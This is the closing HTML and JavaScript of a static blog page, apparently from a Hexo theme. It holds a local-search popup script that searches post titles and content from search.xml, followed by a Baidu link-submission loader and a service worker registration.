    var search_path = "search.xml";
    if (search_path.length == 0) {
      search_path = "search.xml";
    }
    var path = "/blog/" + search_path;
    // monitor main search box;

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.popup').toggle();
    }
    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';
      $.ajax({
        url: path,
        dataType: "xml",
        async: true,
        success: function( xmlResponse ) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = $( "entry", xmlResponse ).map(function() {
            return {
              title: $( "title", this ).text(),
              content: $("content",this).text(),
              url: $( "url" , this).text()
            };
          }).get();
          var $input = document.getElementById(search_id);
          var $resultContent = document.getElementById(content_id);
          $input.addEventListener('input', function(){
            var matchcounts = 0;
            var str='<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length > 1) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var content_index = [];
                var data_title = data.title.trim().toLowerCase();
                var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
                var data_url = decodeURIComponent(data.url);
                var index_title = -1;
                var index_content = -1;
                var first_occur = -1;
                // only match artiles with not empty titles and contents
                if(data_title != '') {
                  keywords.forEach(function(keyword, i) {
                    index_title = data_title.indexOf(keyword);
                    index_content = data_content.indexOf(keyword);
                    if( index_title >= 0 || index_content >= 0 ){
                      isMatch = true;
                      if (i == 0) {
                        first_occur = index_content;
                      }
                    }

                  });
                }
                // show search results
                if (isMatch) {
                  matchcounts += 1;
                  str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
                  var content = data.content.trim().replace(/<[^>]+>/g,"");
                  if (first_occur >= 0) {
                    // cut out 100 characters
                    var start = first_occur - 20;
                    var end = first_occur + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if(start == 0){
                      end = 50;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    var match_content = content.substring(start, end);
                    // highlight all keywords
                    keywords.forEach(function(keyword){
                      var regS = new RegExp(keyword, "gi");
                      match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
                    });

                    str += "<p class=\"search-result\">" + match_content +"...</p>"
                  }
                  str += "</li>";
                }
              })};
            str += "</ul>";
            if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
            if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
            $resultContent.innerHTML = str;
          });
          proceedsearch();
        }
      });}

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched == false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(function(e){
      $('.popup').hide();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    });
    $('.popup').click(function(e){
      e.stopPropagation();
    });
  </script>





  

  
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>


  

  

<script>if ('serviceWorker' in navigator) {
  navigator.serviceWorker.register('/blog/sw.js?t=1665395056011')
    .then(function () {console.log('ServiceWorker Register Successfully.')})
    .catch(function (e) {console.error(e)});
}
</script></body>
</html>
